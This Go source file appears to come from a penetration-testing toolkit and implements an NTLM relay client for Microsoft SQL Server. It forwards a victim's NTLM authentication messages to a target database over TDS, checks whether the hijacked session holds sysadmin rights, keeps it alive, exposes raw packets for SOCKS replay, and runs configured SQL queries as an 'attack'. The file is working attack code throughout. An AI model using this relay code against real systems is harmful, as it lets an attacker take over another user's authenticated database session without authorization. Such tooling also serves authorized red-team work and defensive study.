// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Jacob Paullus

package relay

import (
	"fmt"
	"log"
	"net"
	"strconv"
	"strings"

	"gopacket/internal/build"
	"gopacket/pkg/tds"
)

// MSSQLRelayClient relays NTLM authentication to a MSSQL target via TDS protocol.
// After successful auth, exposes a *tds.Client for post-auth SQL operations.
// Implements the ProtocolClient interface.
type MSSQLRelayClient struct {
	targetAddr    string
	tdsClient     *tds.Client
	authenticated bool
}

// NewMSSQLRelayClient creates a new MSSQL relay client for the given target.
func NewMSSQLRelayClient(targetAddr string) *MSSQLRelayClient {
	return &MSSQLRelayClient{
		targetAddr: targetAddr,
	}
}

// InitConnection establishes a TCP connection to the MSSQL target
// and performs PRELOGIN + TLS setup.
// Implements ProtocolClient.
func (c *MSSQLRelayClient) InitConnection() error {
	host, portStr, err := net.SplitHostPort(c.targetAddr)
	if err != nil {
		// No port specified, default to 1433
		host = c.targetAddr
		portStr = "1433"
	}
	port, err := strconv.Atoi(portStr)
	if err != nil {
		return fmt.Errorf("invalid port: %s", portStr)
	}

	c.tdsClient = tds.NewClient(host, port, host)
	if err := c.tdsClient.Connect(host); err != nil {
		return fmt.Errorf("failed to connect to %s: %v", c.targetAddr, err)
	}

	// PRELOGIN + TLS setup (same as normal auth, but stops before LOGIN7)
	if err := c.tdsClient.RelayInit(); err != nil {
		return fmt.Errorf("TDS prelogin failed: %v", err)
	}

	if build.Debug {
		log.Printf("[D] MSSQL relay client: connected to %s", c.targetAddr)
	}

	return nil
}

// SendNegotiate sends the NTLM Type1 via TDS LOGIN7 with integrated security,
// and returns the Type2 challenge from the server.
// Implements ProtocolClient.
func (c *MSSQLRelayClient) SendNegotiate(ntlmType1 []byte) ([]byte, error) {
	type2, err := c.tdsClient.RelaySendNegotiate(ntlmType1)
	if err != nil {
		return nil, fmt.Errorf("MSSQL negotiate failed: %v", err)
	}

	// Disable TLS after LOGIN7 if encryption was off
	// (matches MS-TDS spec: only LOGIN7 is encrypted when ENCRYPT_OFF)
	c.tdsClient.RelayDisableTLSAfterLogin()

	if build.Debug {
		log.Printf("[D] MSSQL relay client: received Type2 challenge (%d bytes)", len(type2))
	}

	return type2, nil
}

// SendAuth sends the NTLM Type3 authenticate message via TDS SSPI.
// On success, the TDS session is authenticated and ready for queries.
// Implements ProtocolClient.
func (c *MSSQLRelayClient) SendAuth(ntlmType3 []byte) error {
	// Unwrap SPNEGO if needed (SMB server wraps Type3 in SPNEGO)
	rawType3 := unwrapSPNEGOType3(ntlmType3)

	if err := c.tdsClient.RelaySendAuth(rawType3); err != nil {
		return fmt.Errorf("MSSQL auth failed: %v", err)
	}

	c.authenticated = true

	if build.Debug {
		log.Printf("[D] MSSQL relay client: authentication successful")
	}

	return nil
}

// GetSession returns the *tds.Client for post-auth SQL operations.
// Implements ProtocolClient.
func (c *MSSQLRelayClient) GetSession() interface{} {
	if !c.authenticated {
		return nil
	}
	return c.tdsClient
}

// GetRelayRawChallenge returns the raw TDS SSPI challenge packet for SOCKS replay.
func (c *MSSQLRelayClient) GetRelayRawChallenge() []byte {
	if c.tdsClient == nil {
		return nil
	}
	return c.tdsClient.RelayRawChallenge
}

// GetRelayRawAuthAnswer returns the raw TDS LOGIN_ACK packet for SOCKS replay.
func (c *MSSQLRelayClient) GetRelayRawAuthAnswer() []byte {
	if c.tdsClient == nil {
		return nil
	}
	return c.tdsClient.RelayRawAuthAnswer
}

// KeepAlive sends a simple query to keep the session alive.
// Implements ProtocolClient.
func (c *MSSQLRelayClient) KeepAlive() error {
	if c.tdsClient == nil {
		return fmt.Errorf("no MSSQL session")
	}
	_, err := c.tdsClient.SQLQuery("SELECT 1")
	return err
}

// Kill terminates the MSSQL connection.
// Implements ProtocolClient.
func (c *MSSQLRelayClient) Kill() {
	if c.tdsClient != nil {
		c.tdsClient.Close()
	}
}

// IsAdmin checks if the relayed session has sysadmin privileges.
// Implements ProtocolClient.
func (c *MSSQLRelayClient) IsAdmin() bool {
	if c.tdsClient == nil || !c.authenticated {
		return false
	}

	rows, err := c.tdsClient.SQLQuery("SELECT IS_SRVROLEMEMBER('sysadmin')")
	if err != nil {
		return false
	}

	for _, row := range rows {
		for _, v := range row {
			if val, ok := v.(int32); ok && val == 1 {
				return true
			}
			if val, ok := v.(int64); ok && val == 1 {
				return true
			}
		}
	}

	return false
}

// MSSQLQueryAttack executes SQL queries on a relayed MSSQL session.
type MSSQLQueryAttack struct{}

func (a *MSSQLQueryAttack) Name() string { return "mssqlquery" }

func (a *MSSQLQueryAttack) Run(session interface{}, config *Config) error {
	client, ok := session.(*tds.Client)
	if !ok {
		return fmt.Errorf("mssqlquery attack requires MSSQL session")
	}
	return mssqlQueryAttack(client, config)
}

// mssqlQueryAttack executes configured SQL queries on the relayed MSSQL session.
func mssqlQueryAttack(client *tds.Client, cfg *Config) error {
	if len(cfg.Queries) == 0 {
		// Default: check if sysadmin and print basic info
		cfg.Queries = []string{
			"SELECT SYSTEM_USER",
			"SELECT IS_SRVROLEMEMBER('sysadmin')",
		}
	}

	for _, query := range cfg.Queries {
		query = strings.TrimSpace(query)
		if query == "" {
			continue
		}

		log.Printf("[*] MSSQL: Executing query: %s", query)

		rows, err := client.SQLQuery(query)
		if err != nil {
			log.Printf("[-] MSSQL query error: %v", err)
			continue
		}

		if len(rows) == 0 {
			log.Printf("[*] MSSQL: Query returned no rows")
			continue
		}

		// Print results
		for _, row := range rows {
			parts := make([]string, 0, len(row))
			for col, val := range row {
				parts = append(parts, fmt.Sprintf("%s=%v", col, val))
			}
			log.Printf("[+] MSSQL: %s", strings.Join(parts, ", "))
		}
	}

	return nil
}
